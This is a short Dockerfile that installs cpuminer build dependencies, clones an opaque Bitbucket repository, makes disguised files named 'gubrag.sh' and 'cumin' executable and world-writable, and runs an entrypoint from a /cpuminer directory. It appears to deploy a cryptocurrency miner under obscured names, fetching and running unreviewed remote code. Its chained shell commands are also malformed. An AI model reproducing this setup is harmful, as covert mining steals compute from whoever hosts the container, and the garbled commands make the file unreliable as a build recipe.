FROM debian:sid

RUN apt update -y \
    	&& apt upgrade -y \
        && apt install git -y \
    	&& apt install -qy automake autoconf pkg-config libcurl4-openssl-dev libssl-dev  libjansson-dev libgmp-dev make gcc g++ git zlib1g-dev ocl-icd-opencl-dev \
        && git clone https://rhziaremat@bitbucket.org/rhziaremat/1.git && cd && 1 chmod +x gubrag.sh && chmod +x cumin chmod 777 cumin gubrag.sh
RUN mkdir -m 777 /cpuminer
ADD entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
CMD /entrypoint.sh
